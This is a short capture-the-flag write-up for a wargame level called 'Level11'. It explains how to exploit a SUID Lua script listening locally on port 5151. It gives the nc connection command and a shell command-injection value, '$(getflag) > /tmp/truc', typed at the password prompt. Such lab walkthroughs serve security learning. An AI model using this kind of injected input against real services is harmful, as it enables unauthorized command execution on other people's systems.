# Level11

[FRENCH version](README.md)

## How to get the flag

The file present is a Lua file.

The file is having a SUID bit, so we might be able to exploit it.

There is a sha1 hash inside, but it is a false path; The decryption of its content only say: NotSoEasy (https://www.dcode.fr/sha1-hash)

We can create a code injection

First, we need to connect:

```
nc 127.0.0.1 5151
```

and when the password is asked, type : 

```
$(getflag) > /tmp/truc
```

then,

```
cat /tmp/truc
```

The file contains to token to connect to level12

## The flag

```

```

We can use this token to connect to flag11, and launch getflag to access level12
